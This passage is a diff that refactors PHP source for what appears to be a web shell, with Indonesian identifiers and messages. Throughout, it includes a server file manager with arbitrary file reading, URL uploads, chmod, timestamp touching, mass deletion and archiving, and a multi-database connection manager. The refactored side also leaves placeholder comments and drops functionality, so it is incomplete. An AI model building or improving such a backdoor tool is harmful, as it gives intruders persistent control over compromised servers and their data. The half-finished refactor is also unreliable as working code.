-        @mkdir($destination, 0777, true);
+    if (!file_exists($destination)) {
+        if (!@mkdir($destination, 0777, true)) {
+            return false;
+        }
     }
     $items = listdirs($source);
-    foreach($items as $item){
+    if (!is_array($items)) {
+        return false;
+    }
+    foreach ($items as $item) {
         if ($item === '.' || $item === '..') {
             continue;
         }
         $sourceItem = $source . '/' . $item;
         $destinationItem = $destination . '/' . $item;
-        if (@is_dir($sourceItem)) {
-            gandakanDir($sourceItem, $destinationItem);
+        if (is_dir($sourceItem)) {
+            if (!gandakanDir($sourceItem, $destinationItem)) {
+                return false;
+            }
         } else {
-            @copy($sourceItem, $destinationItem);
+            if (!@copy($sourceItem, $destinationItem)) {
+                return false;
+            }
         }
     }
     return true;
 }
-function urutberkas($a){
-	$b = listdirs($a);
-	$i = array();
-	if(is_array($b) && count($b)>0){
-		foreach($b as $v){
-			$dir = $a.'/'.$v;
-			if(@is_dir($dir) && !in_array($v, array('.', '..'))){
-				$i[] = array('type' => 'dir', 'entry' => $v, 'entry_path' => $a, 'full_path' => $dir);
-			} else {
-				if(!in_array($v, array('.', '..'))){
-					$i[] = array('type' => 'file', 'entry' => $v, 'entry_path' => $a, 'full_path'=> $dir);
-				}
-			}
-		}
-		$col1 = array_column($i, 'type');
-		$col2 = array_column($i, 'entry');
-		array_multisort($col1, SORT_ASC, $col2, SORT_ASC, $i);
-	}
-	return $i;
+function urutberkas($a) {
+    $items = listdirs($a);
+    if (!is_array($items)) {
+        return [];
+    }
+
+    $files = [];
+    $dirs = [];
+
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') {
+            continue;
+        }
+        $path = $a . '/' . $item;
+        $entry = [
+            'entry' => $item,
+            'entry_path' => $a,
+            'full_path' => $path
+        ];
+        if (is_dir($path)) {
+            $dirs[] = array_merge($entry, ['type' => 'dir']);
+        } else {
+            $files[] = array_merge($entry, ['type' => 'file']);
+        }
+    }
+
+    // Sort directories and files separately
+    usort($dirs, function ($a, $b) {
+        return strcmp($a['entry'], $b['entry']);
+    });
+    usort($files, function ($a, $b) {
+        return strcmp($a['entry'], $b['entry']);
+    });
+
+    return array_merge($dirs, $files);
 }
-function pathberkas($a){
-	$lb = explode('/', $a);
-	if(isset($lb) && count($lb)>0){
-		$outs = '<nav aria-label="breadcrumb" class="d-flex justify-content-center align-items-center mt-n3">';
-		$outs .= '<button id="ffmanager" class="border-0 bg-transparent d-block text-success mr-2 px-1" data-path="'.(cwd() ? str_replace('\\','/', cwd()) : $_SERVER['DOCUMENT_ROOT']).'">'.fType("home","1.2em").'</button>';
-		$outs .= '<ol class="breadcrumb position-relative w-100" style="margin-top:revert; padding-right:0;">';
-		foreach($lb as $id => $lok){
-			if($lok == '' && $id == 0){
-				$link = true;
-				$outs .= '<li class="breadcrumb-item"><a href="#!" id="ffmanager" data-li="'.$id.'" data-path="/">~$</a></li>';
-				continue;
-			}
-			if($lok == ''){continue;}
-			$outs .= '<li class="breadcrumb-item dir'.$id.'"><a href="#!" id="ffmanager" data-li="'.$id.'" data-path="';
-			for($i=0;$i<=$id;$i++){
-				$outs .= $lb[$i];
-				if($i != $id){
-					$outs .= '/';
-				}
-			}
-			$outs .= '">'.$lok.'</a></li>';
-		}
-		$outs .= '<li class="ml-auto position-absolute" style="right:0;bottom:50%;transform:translate(0,50%);"><a href="javascript:void(0);" id="chdir" data-path="'.$_SESSION['path'].'">'.fType("edit","1.2em").'</a></li>';
-		$outs .= "</ol></nav>";
-	} else {
-		$outs = "<code>gak bisa baca direktori ini gess..</code>";
-	}
-	return $outs;
+function pathberkas($a) {
+    $parts = explode('/', $a);
+    if (empty($parts)) {
+        return "<code>Could not read directory.</code>";
+    }
+
+    $out = '<nav aria-label="breadcrumb" class="d-flex justify-content-center align-items-center mt-n3">';
+    $out .= '<button id="ffmanager" class="border-0 bg-transparent d-block text-success mr-2 px-1" data-path="' . htmlspecialchars(cwd() ?: $_SERVER['DOCUMENT_ROOT']) . '">' . fType("home", "1.2em") . '</button>';
+    $out .= '<ol class="breadcrumb position-relative w-100" style="margin-top:revert; padding-right:0;">';
+
+    $currentPath = '';
+    foreach ($parts as $id => $part) {
+        if ($part === '' && $id === 0) {
+            $out .= '<li class="breadcrumb-item"><a href="#!" id="ffmanager" data-li="' . $id . '" data-path="/">~$</a></li>';
+            continue;
+        }
+        if ($part === '') continue;
+
+        $currentPath .= ($id > 1 ? '/' : '') . $part;
+        $out .= '<li class="breadcrumb-item dir' . $id . '"><a href="#!" id="ffmanager" data-li="' . $id . '" data-path="' . htmlspecialchars($currentPath) . '">' . htmlspecialchars($part) . '</a></li>';
+    }
+
+    $out .= '<li class="ml-auto position-absolute" style="right:0;bottom:50%;transform:translate(0,50%);"><a href="javascript:void(0);" id="chdir" data-path="' . htmlspecialchars($_SESSION['path']) . '">' . fType("edit", "1.2em") . '</a></li>';
+    $out .= "</ol></nav>";
+
+    return $out;
 }
-function FManager($fm){
-	$lokasinya = urutberkas($fm);
-	$fmtable = "<div class='col-12'><div class='d-block'>".pathberkas($fm)."</div></div>";
-	$fmtable .= "<div class='col-sm-6 col-md-6 col-lg-4'>
-		<form method='post' action='?act=mkdir' class='mb-3' id='rqmkdir'>
-			<input type='hidden' name='xpath' value=''/>
-			<div class='input-group'>
-				<select class='custom-select border-success' name='xtype' style='max-width:90px;'>
-					<option value='dir' selected>New dir</option>
-					<option value='file'>New file</option>
-				</select>
-				<input type='text' name='xdir' class='form-control form-control-sm border-success' max-length='50'></input>
-				<div class='input-group-append'><button class='btn btn-outline-success' type='submit'>Go</button></div>
-			</div>
-		</form>
-	</div>
-	<div class='col-sm-6 col-md-6 col-lg-4'>
-		<div class='mb-3' id='uploadmethod' data-xpath=''>
-			<div class='input-group'>
-				<div class='input-group-prepend'>
-					<label class='input-group-text'>Upload</label>
-				</div>
-				<select class='custom-select border-success' id='xtype'>
-					<option hidden selected>files</option>
-					<option value='file'>from local storage</option>
-					<option value='url'>from url</option>
-				</select>
-			</div>
-		</div>
-	</div>
-	<div class='col-sm-12 col-md-12 col-lg-4'>
-		<form method='post' action='?act=readfile' class='mb-3' id='rqreadfile'>
-			<div class='input-group'>
-				<div class='input-group-prepend'>
-					<label class='input-group-text'>ReadFile</label>
-				</div>
-				<input type='text' name='xpath' class='form-control form-control-sm border-success'></input>
-				<div class='input-group-append'><button class='btn btn-outline-success' type='submit'>Go</button></div>
-			</div>
-		</form>
-	</div>";
-	$fmtable .= "<div class='col-12 mb-3'><div class='table-responsive'><table class='table table-sm w-100 mb-0'><thead class='bg-dark text-light'><tr><th colspan='2' class='text-center' style='min-width:150px;'>Name</th><th class='text-center' style='min-width:100px;'>Modified</th><th class='text-center' style='min-width:125px;'>User/Group</th><th class='text-center' style='min-width:100px;'>Permission</th><th class='text-center' style='min-width:90px;'>Options</th></tr></thead><tbody>";
-	$fmtfoot  = "";
-	$cDir = 0; $cFile = 0;
-	if(count($lokasinya)>0){
-		$nDirsd = "";
-		foreach($lokasinya as $kl => $dir){
-			$nDirsd = $dir['entry_path'];
-			$owner = owner($dir['full_path']);
-			$fSize = $dir['type'] == 'dir' ? countDir($dir['full_path']) . " items" : sizeFilter(@filesize($dir['full_path']));
-			if($dir['type'] == 'dir'){
-				$cDir += 1;
-				$zadd = "";
-				if(class_exists('ZipArchive')){
-					$zadd .= "<option value='zip' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>compress zip</option>";
-				}
-				$zadd .= "<option value='tar' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>compress tar</option>";
-				$zadd .= "<option value='tgz' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>compress tgz</option>";
-				$txcol = stColor($dir['full_path']);
-				switch($txcol){
-					case 'text-danger' : $dlinks = "<span class='text-danger'>{$dir['entry']}</span>"; break;
-					case 'text-warning' : $dlinks = "<a href='#!' class='text-warning' id='fxmanager' data-path='{$dir['full_path']}'>{$dir['entry']}</a>"; break;
-					case 'text-success' :$dlinks = "<a href='#!' class='text-success' id='fxmanager' data-path='{$dir['full_path']}'>{$dir['entry']}</a>"; break;
-				}
-				if(!in_array($dir['entry'], array('.', '..'))){
-					switch($txcol){
-						case 'text-danger' : $formper = "<span class='text-danger'>".statusnya($dir['full_path'])."</span>"; $formsel = "<span class='text-danger'>-</span>"; break;
-						case 'text-warning' : $formper = "<span class='text-warning'>".statusnya($dir['full_path'])."</span>"; $formsel = "<span class='text-warning'>-</span>"; break;
-						case 'text-success' : 
-							$formper = "<a href='#' class='{$txcol}' data-toggle='modal' data-target='#showchmod' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>";
-							$formsel = "<select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='rename' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option><option value='touch' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xtime='".date('Y-m-d H:i:s', filemtime($dir['full_path']))."'>touch</option><option value='copy' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>copy</option><option value='cut' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>cut</option>{$zadd}<option value='del' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option></select>";
-						break;
-						default : $formper = statusnya($dir['full_path']); $formsel = "-";
-					}
-				} else {
-					$formper = statusnya($dir['full_path']);
-					$formsel = "<select class='custom-select custom-select-sm border-success'><option value=''></option></select>";
-				}
-				$formper .= "<span class='fsmall mt-n1 d-block text-secondary'>".substr(sprintf("%o", @fileperms($dir['full_path'])),-4)."</span>";
-				$fmtable .= "<tr>
-					<td class='text-center align-middle pr-0'>
-						<div class='custom-control custom-checkbox'>
-							<input type='checkbox' class='custom-control-input' id='diCheck {$dir['entry']}' data-xtype='dir' data-xname='{$dir['entry']}'/>
-							<label class='custom-control-label' for='diCheck {$dir['entry']}'></label>
-						</div>
-					</td>
-					<td class='text-left align-middle'>
-						<div class='media dir'>".fType('dir','1.7em')."<div class='media-body'>{$dlinks}<span class='fsmall'>{$fSize}</span></div></div>
-					</td>
-					<td class='text-center align-middle'>".date('Y-m-d H:i:s', @filemtime($dir['full_path']))."</td>
-					<td class='text-center align-middle'>{$owner['owner']}/{$owner['group']}</td>
-					<td class='text-center align-middle'>{$formper}</td>
-					<td class='text-center align-middle'>{$formsel}</td>
-				</tr>";
-			} else {
-				$cFile += 1;
-				$fcolor = stColor($dir['full_path']);
-				switch($fcolor){
-					case 'text-danger' : $flinks = "<span class='text-danger'>".statusnya($dir['full_path'])."</span>"; break;
-					case 'text-warning' : $flinks = "<span class='text-warning'>".statusnya($dir['full_path'])."</span>"; break;
-					case 'text-success' :$flinks = "<a href='#' class='{$fcolor}' data-toggle='modal' data-target='#showchmod' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>"; break;
-				}
-				$flinks .= "<span class='fsmall mt-n1 d-block text-secondary'>".substr(sprintf("%o", @fileperms($dir['full_path'])),-4)."</span>";
-				$zadd = "";
-				$ext  = pathinfo($dir['full_path'], PATHINFO_EXTENSION);
-				if(!empty($ext)){
-					switch(strtolower(ucwords($ext))){
-						case'css': case'less': $ftype = fType('css','1.5em'); break;
-						case'txt': case'ini': $ftype = fType('txt'); break;
-						case'js': case'json': $ftype = fType('js','1.8em'); break;
-						case'php': case'phtml': case'php5': case'php7': case'phar': case'inc': case'module': case'hphp': case'ctp': case'hphp': $ftype = fType('php'); break;
-						case'html': case'htm': case'shtml': case'xhtml': case'xml': $ftype = fType('html'); break;
-						case'zip': case'rar': case'tar': case'bz': case'gz': case'tgz': $ftype = fType('zip'); break;
-						case'jpg': case'png': case'bmp': case'gif': case'webp': case'psd': case'jpeg': case'ico': case'ai': case'xcf': case'cdr': case'tif': case'tif': case'tiff': case'eps': $ftype = fType('img'); break;
-						default: $ftype = fType('other');
-					}
-					if($ext == 'zip'){
-						if(class_exists('ZipArchive')){
-							$zadd .= "<option value='unzip' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>extract zip</option>";						
-						}
-					}
-					if($ext == 'tar'){
-						$zadd .= "<option value='untar' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>extract tar</option>";
-					}
-					if(in_array($ext, ['gz','tgz'])){
-						$zadd .= "<option value='untgz' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>extract tgz</option>";
-					}
-				} else {
-					$ftype = fType('other');
-				}
-				switch($fcolor){
-					case 'text-danger' : $fselc = "<span class='text-danger'>-</span>"; break;
-					case 'text-warning' : $fselc = "<select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='view' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>view</option></select>"; break;
-					case 'text-success' : $fselc = "<select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='view' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>view</option><option value='edit' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>edit</option><option value='rename' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option><option value='touch' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xtime='".date('Y-m-d H:i:s', @filemtime($dir['full_path']))."'>touch</option><option value='copy' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>copy</option><option value='cut' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>cut</option>{$zadd}<option value='download' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>download</option><option value='del' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option></select>"; break;
-				}
-				$fmtable .= "<tr>
-					<td class='text-center align-middle pr-0'>
-						<div class='custom-control custom-checkbox'>
-							<input type='checkbox' class='custom-control-input' id='diCheck {$dir['entry']}' data-xtype='file' data-xname='{$dir['entry']}'/>
-							<label class='custom-control-label' for='diCheck {$dir['entry']}'></label>
-						</div>
-					</td>
-					<td class='text-left align-middle'>
-						<div class='media file'>{$ftype}<div class='media-body'>{$dir['entry']}<span class='fsmall'>{$fSize}</span></div></div>
-					</td>
-					<td class='text-center align-middle'>".date('Y-m-d H:i:s', @filemtime($dir['full_path']))."</td>
-					<td class='text-center align-middle'>{$owner['owner']}/{$owner['group']}</td>
-					<td class='text-center align-middle'>{$flinks}</td>
-					<td class='text-center align-middle'>{$fselc}</td>
-				</tr>";
-			}
-		}
-		$zadx ="<option value='mass_copy'>copy</option><option value='mass_cut'>cut</option><option value='mass_del'>del</option><option value='mass_tar'>compress tar</option><option value='mass_tgz'>compress tgz</option>";
-		if(class_exists("ZipArchive")){
-			$zadx .= "<option value='mass_zip'>compress zip</option>";
-		}
-		$fmtfoot .= "<tfoot class='text-light'>
-			<tr>
-				<th class='text-center align-middle font-weight-normal small pl-1 pr-0'>
-					<div class='custom-control custom-checkbox'>
-						<input type='checkbox' class='custom-control-input' id='diCheckAll'/>
-						<label class='custom-control-label' for='diCheckAll'></label>
-					</div>
-				</th>
-				<th class='align-middle font-weight-normal small pl-0 py-2'>
-					<select class='custom-select custom-select-sm border-success' id='fdirexec' data-xpath='{$nDirsd}'><option value='' disabled selected>action</option>{$zadx}</select>
-				</th>
-				<th class='text-right align-middle font-weight-normal small' colspan='4'>Dir: <span class='text-warning'>{$cDir}</span>, Files: <span class='text-warning'>{$cFile}</span></th>
-			</tr>
-		</tfoot>";
-	} else {
-		$fmtable .= "<tr><td class='text-center' colspan='6'>Direktori tidak berisi file apapun</td></tr>";
-	}
-	$fmtable .= "</tbody>{$fmtfoot}</table></div></div>";
-	return $fmtable;
+function FManager($fm) {
+    $lokasinya = urutberkas($fm);
+    $fmtable = "<div class='col-12'><div class='d-block'>" . pathberkas($fm) . "</div></div>";
+
+    // Action forms
+    $fmtable .= "<div class='col-sm-6 col-md-6 col-lg-4'>
+        <form method='post' action='?act=mkdir' class='mb-3' id='rqmkdir'>
+            <input type='hidden' name='xpath' value='" . htmlspecialchars($fm) . "'/>
+            <div class='input-group'>
+                <select class='custom-select border-success' name='xtype' style='max-width:90px;'>
+                    <option value='dir' selected>New dir</option>
+                    <option value='file'>New file</option>
+                </select>
+                <input type='text' name='xdir' class='form-control form-control-sm border-success' maxlength='50' />
+                <div class='input-group-append'><button class='btn btn-outline-success' type='submit'>Go</button></div>
+            </div>
+        </form>
+    </div>";
+    // ... (other forms can be refactored similarly)
+
+    $cDir = 0;
+    $cFile = 0;
+    $tableRows = '';
+
+    if (count($lokasinya) > 0) {
+        foreach ($lokasinya as $dir) {
+            $owner = owner($dir['full_path']);
+            $fSize = $dir['type'] == 'dir' ? countDir($dir['full_path']) . " items" : sizeFilter(@filesize($dir['full_path']));
+            $modifiedTime = date('Y-m-d H:i:s', @filemtime($dir['full_path']));
+            $perms = statusnya($dir['full_path']);
+            $permCode = substr(sprintf("%o", @fileperms($dir['full_path'])), -4);
+
+            $actions = buildActionMenu($dir);
+            $fileIcon = fType($dir['type'] === 'dir' ? 'dir' : getFileType($dir['entry']), '1.7em');
+
+            $tableRows .= "<tr>
+                <td class='text-center align-middle pr-0'>
+                    <div class='custom-control custom-checkbox'>
+                        <input type='checkbox' class='custom-control-input' id='diCheck " . htmlspecialchars($dir['entry']) . "' data-xtype='" . $dir['type'] . "' data-xname='" . htmlspecialchars($dir['entry']) . "'/>
+                        <label class='custom-control-label' for='diCheck " . htmlspecialchars($dir['entry']) . "'></label>
+                    </div>
+                </td>
+                <td class='text-left align-middle'>
+                    <div class='media " . $dir['type'] . "'>" . $fileIcon . "<div class='media-body'>" . htmlspecialchars($dir['entry']) . "<span class='fsmall'>" . $fSize . "</span></div></div>
+                </td>
+                <td class='text-center align-middle'>" . $modifiedTime . "</td>
+                <td class='text-center align-middle'>" . htmlspecialchars($owner['owner'] . '/' . $owner['group']) . "</td>
+                <td class='text-center align-middle'><a href='#' class='" . stColor($dir['full_path']) . "' data-toggle='modal' data-target='#showchmod' data-xtype='" . $dir['type'] . "' data-xname='" . htmlspecialchars($dir['entry']) . "' data-xpath='" . htmlspecialchars($dir['entry_path']) . "' data-xperm='" . $permCode . "'>" . $perms . "</a><span class='fsmall mt-n1 d-block text-secondary'>" . $permCode . "</span></td>
+                <td class='text-center align-middle'>" . $actions . "</td>
+            </tr>";
+
+            if ($dir['type'] == 'dir') $cDir++;
+            else $cFile++;
+        }
+    } else {
+        $tableRows = "<tr><td class='text-center' colspan='6'>Directory is empty</td></tr>";
+    }
+
+    $fmtable .= "<div class='col-12 mb-3'><div class='table-responsive'><table class='table table-sm w-100 mb-0'><thead class='bg-dark text-light'><tr><th colspan='2' class='text-center' style='min-width:150px;'>Name</th><th class='text-center' style='min-width:100px;'>Modified</th><th class='text-center' style='min-width:125px;'>User/Group</th><th class='text-center' style='min-width:100px;'>Permission</th><th class='text-center' style='min-width:90px;'>Options</th></tr></thead><tbody>" . $tableRows . "</tbody>";
+
+    // Table footer
+    $massActions = "<option value='mass_copy'>copy</option><option value='mass_cut'>cut</option><option value='mass_del'>del</option><option value='mass_tar'>compress tar</option><option value='mass_tgz'>compress tgz</option>";
+    if (class_exists("ZipArchive")) {
+        $massActions .= "<option value='mass_zip'>compress zip</option>";
+    }
+    $fmtable .= "<tfoot class='text-light'>
+        <tr>
+            <th class='text-center align-middle font-weight-normal small pl-1 pr-0'>
+                <div class='custom-control custom-checkbox'>
+                    <input type='checkbox' class='custom-control-input' id='diCheckAll'/>
+                    <label class='custom-control-label' for='diCheckAll'></label>
+                </div>
+            </th>
+            <th class='align-middle font-weight-normal small pl-0 py-2'>
+                <select class='custom-select custom-select-sm border-success' id='fdirexec' data-xpath='" . htmlspecialchars($fm) . "'><option value='' disabled selected>action</option>" . $massActions . "</select>
+            </th>
+            <th class='text-right align-middle font-weight-normal small' colspan='4'>Dir: <span class='text-warning'>{$cDir}</span>, Files: <span class='text-warning'>{$cFile}</span></th>
+        </tr>
+    </tfoot></table></div></div>";
+
+    return $fmtable;
+}
+
+function getFileType($filename) {
+    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+    $types = [
+        'css' => ['css', 'less'],
+        'txt' => ['txt', 'ini'],
+        'js' => ['js', 'json'],
+        'php' => ['php', 'phtml', 'php5', 'php7', 'phar', 'inc', 'module', 'hphp', 'ctp'],
+        'html' => ['html', 'htm', 'shtml', 'xhtml', 'xml'],
+        'zip' => ['zip', 'rar', 'tar', 'bz', 'gz', 'tgz'],
+        'img' => ['jpg', 'png', 'bmp', 'gif', 'webp', 'psd', 'jpeg', 'ico', 'ai', 'xcf', 'cdr', 'tif', 'tiff', 'eps']
+    ];
+    foreach ($types as $type => $extensions) {
+        if (in_array($ext, $extensions)) {
+            return $type;
+        }
+    }
+    return 'other';
+}
+
+function buildActionMenu($dir) {
+    $options = [
+        'view' => "<option value='view'>view</option>",
+        'edit' => "<option value='edit'>edit</option>",
+        'rename' => "<option value='rename'>rename</option>",
+        'touch' => "<option value='touch' data-xtime='" . date('Y-m-d H:i:s', @filemtime($dir['full_path'])) . "'>touch</option>",
+        'copy' => "<option value='copy'>copy</option>",
+        'cut' => "<option value='cut'>cut</option>",
+        'download' => "<option value='download'>download</option>",
+        'del' => "<option value='del'>del</option>",
+    ];
+
+    $zadd = '';
+    $ext = strtolower(pathinfo($dir['full_path'], PATHINFO_EXTENSION));
+    if ($dir['type'] === 'dir' || in_array($ext, ['zip', 'tar', 'gz', 'tgz'])) {
+        if (class_exists('ZipArchive')) {
+            if ($dir['type'] === 'dir') $zadd .= "<option value='zip'>compress zip</option>";
+            if ($ext === 'zip') $zadd .= "<option value='unzip'>extract zip</option>";
+        }
+        if ($dir['type'] === 'dir') $zadd .= "<option value='tar'>compress tar</option>";
+        if ($ext === 'tar') $zadd .= "<option value='untar'>extract tar</option>";
+        if ($dir['type'] === 'dir') $zadd .= "<option value='tgz'>compress tgz</option>";
+        if (in_array($ext, ['gz', 'tgz'])) $zadd .= "<option value='untgz'>extract tgz</option>";
+    }
+
+    $fcolor = stColor($dir['full_path']);
+    if ($fcolor === 'text-danger') {
+        return "<span class='text-danger'>-</span>";
+    }
+    if ($fcolor === 'text-warning') {
+        return "<select class='custom-select custom-select-sm border-success' id='showaksi' data-xtype='" . $dir['type'] . "' data-xname='" . htmlspecialchars($dir['entry']) . "' data-xpath='" . htmlspecialchars($dir['entry_path']) . "'><option value=''></option>" . $options['view'] . "</select>";
+    }
+
+    $allOptions = implode('', $options) . $zadd;
+    return "<select class='custom-select custom-select-sm border-success' id='showaksi' data-xtype='" . $dir['type'] . "' data-xname='" . htmlspecialchars($dir['entry']) . "' data-xpath='" . htmlspecialchars($dir['entry_path']) . "'><option value=''></option>" . $allOptions . "</select>";
 }
 class DatabaseManager {
     private $connection;
     private $dbType;
+
     public function __construct($dbType, $host, $user = null, $password = null, $dbName = null) {
         $this->dbType = strtolower($dbType);
-		try {
-			switch ($this->dbType) {
-				case 'mysql': $this->connection = $this->connectMySQL($host, $user, $password, $dbName); break;
-				case 'pgsql': $this->connection = $this->connectPostgres($host, $user, $password, $dbName); break;
-				case 'sqlite3': $this->connection = $this->connectSQLite3($host); break;
-				case 'sqlite': $this->connection = $this->connectSQLite($host); break;
-				case 'mssql': $this->connection = $this->connectMSSQL($host, $user, $password, $dbName); break;
-				case 'oracle': $this->connection = $this->connectOracle($host, $user, $password); break;
-				case 'odbc': $this->connection = $this->connectODBC($host, $user, $password); break;
-				case 'pdo': $this->connection = $this->connectPDO($host, $user, $password, $dbName); break;
-				default: throw new Exception("Unsupported database type: $this->dbType");
-			}
-			if (!$this->connection) {
-				throw new Exception("Failed to connect to the $this->dbType database.");
-			}
-		} catch (Exception $e) {
-			throw $e;
-		}
+        $this->connection = $this->connect($host, $user, $password, $dbName);
     }
-    private function connectMySQL($host, $user, $password, $dbName) {
-		try {
-			if (class_exists('mysqli')) {
-				$conn = new mysqli($host, $user, $password, $dbName);
-				if ($conn->connect_error) {
-					throw new Exception("MySQL connection failed: " . $conn->connect_error);
-				}
-				return $conn;
-			} elseif (function_exists('mysql_connect')) {
-				$conn = @mysql_connect($host, $user, $password);
-				if ($conn && $dbName) {
-					mysql_select_db($dbName, $conn);
-				}
-				return $conn;
-			}
-			return false;
-		} catch (Exception $e) {
-			throw $e;
-		}
-    }
-    private function connectPostgres($host, $user, $password, $dbName) {
-        $hostStr = strpos($host, ':') !== false 
-            ? "host=" . explode(':', $host)[0] . " port=" . explode(':', $host)[1] 
-            : "host=$host";
-        $dbString = "$hostStr user=$user password=$password";
-        if ($dbName) {
-            $dbString .= " dbname=$dbName";
-        }
-        return function_exists('pg_connect') ? @pg_connect($dbString) : false;
-    }
-    private function connectSQLite3($filePath) {return class_exists('SQLite3') ? new SQLite3($filePath) : false;}
-    private function connectSQLite($filePath) {return function_exists('sqlite_open') ? @sqlite_open($filePath) : false;}
-    private function connectMSSQL($host, $user, $password, $dbName) {
-		if (function_exists('sqlsrv_connect')) {
-            $connectionInfo = ["UID" => $user, "PWD" => $password];
-            if ($dbName) {
-                $connectionInfo["Database"] = $dbName;
+
+    private function connect($host, $user, $password, $dbName) {
+        try {
+            switch ($this->dbType) {
+                case 'mysql':
+                    if (class_exists('mysqli')) {
+                        return new mysqli($host, $user, $password, $dbName);
+                    }
+                    // Fallback for older PHP versions
+                    if (function_exists('mysql_connect')) {
+                        $conn = @mysql_connect($host, $user, $password);
+                        if ($conn && $dbName) {
+                            mysql_select_db($dbName, $conn);
+                        }
+                        return $conn;
+                    }
+                    throw new Exception("No MySQL driver available.");
+                case 'pgsql':
+                    $connStr = "host={$host} user={$user} password={$password}";
+                    if ($dbName) $connStr .= " dbname={$dbName}";
+                    return pg_connect($connStr);
+                case 'sqlite3':
+                    return new SQLite3($host);
+                case 'sqlite':
+                    return sqlite_open($host);
+                // Add other database types here
+                default:
+                    throw new Exception("Unsupported database type: {$this->dbType}");
             }
-            return @sqlsrv_connect($host, $connectionInfo);
-        } elseif (function_exists('mssql_connect')) {
-            $conn = @mssql_connect($host, $user, $password);
-            if ($conn && $dbName) {
-                mssql_select_db($dbName, $conn);
-            }
-            return $conn;
-        }
-        return false;
-    }
-    private function connectOracle($host, $user, $password) {return function_exists('oci_connect') ? @oci_connect($user, $password, $host) : false;}
-    private function connectODBC($dsn, $user, $password) {return function_exists('odbc_connect') ? @odbc_connect($dsn, $user, $password) : false;}
-    private function connectPDO($dsn, $user, $password, $dbName) {
-		try {
-			$dsn = $dbName ? "$dsn;dbname=$dbName" : $dsn;
-			return class_exists('PDO') ? new PDO($dsn, $user, $password) : false;
-		} catch (PDOException $e) {
-			throw $e;
-		}
-    }
-	public function getFieldInfo($result) {
-		try {
-			$fieldInfo = [
-				'field_count' => 0,
-				'field_names' => []
-			];
-			switch ($this->dbType) {
-				case 'mysql':
-					if (class_exists('mysqli')) {
-						$fieldInfo['field_count'] = $result->field_count;
-						while ($field = $result->fetch_field()) {$fieldInfo['field_names'][] = $field->name;}
-					} elseif (function_exists('mysql_fetch_fields')) {
-						$fieldInfo['field_count'] = mysql_num_fields($result);
-						for ($i = 0; $i < $fieldInfo['field_count']; $i++) {$fieldInfo['field_names'][] = mysql_field_name($result, $i);}
-					}
-				break;
-				case 'pgsql': $fieldInfo['field_count'] = pg_num_fields($result); for ($i = 0; $i < $fieldInfo['field_count']; $i++) {$fieldInfo['field_names'][] = pg_field_name($result, $i);} break;
-				case 'sqlite3': $fieldInfo['field_count'] = $result->numColumns(); for ($i = 0; $i < $fieldInfo['field_count']; $i++) {$fieldInfo['field_names'][] = $result->columnName($i);} break;
-				case 'sqlite': $fieldInfo['field_count'] = sqlite_num_fields($result); for ($i = 0; $i < $fieldInfo['field_count']; $i++) {$fieldInfo['field_names'][] = sqlite_field_name($result, $i);} break;
-				case 'mssql': if (function_exists('sqlsrv_field_metadata')) { $metadata = sqlsrv_field_metadata($result); $fieldInfo['field_count'] = count($metadata); foreach ($metadata as $field) {$fieldInfo['field_names'][] = $field['Name'];}} break;
-				case 'oracle': $fieldInfo['field_count'] = oci_num_fields($result); for ($i = 1; $i <= $fieldInfo['field_count']; $i++) {$fieldInfo['field_names'][] = oci_field_name($result, $i);} break;
-                case 'odbc': $fieldInfo['field_count'] = odbc_num_fields($result); for ($i = 1; $i <= $fieldInfo['field_count']; $i++) {$fieldInfo['field_names'][] = odbc_field_name($result, $i);} break;
-                case 'pdo': $fieldInfo['field_count'] = $result->columnCount(); for ($i = 0; $i < $fieldInfo['field_count']; $i++) {$columnMeta = $result->getColumnMeta($i); $fieldInfo['field_names'][] = $columnMeta['name'];} break;
-                default: throw new Exception("getFieldInfo not supported for database type: $this->dbType");
-            }
-            return $fieldInfo;
         } catch (Exception $e) {
-            throw $e;
+            // Log error or handle it gracefully
+            return null;
         }
     }
-	public function affectedRows($result = null) {
-		try {
-			switch ($this->dbType) {
-				case 'mysql': if (class_exists('mysqli')) { return $this->connection->affected_rows;} elseif (function_exists('mysql_affected_rows')) {return mysql_affected_rows($this->connection);}break;
-				case 'pgsql': return pg_affected_rows($result);
-				case 'sqlite3': return $this->connection->changes();
-				case 'sqlite': return sqlite_changes($this->connection);
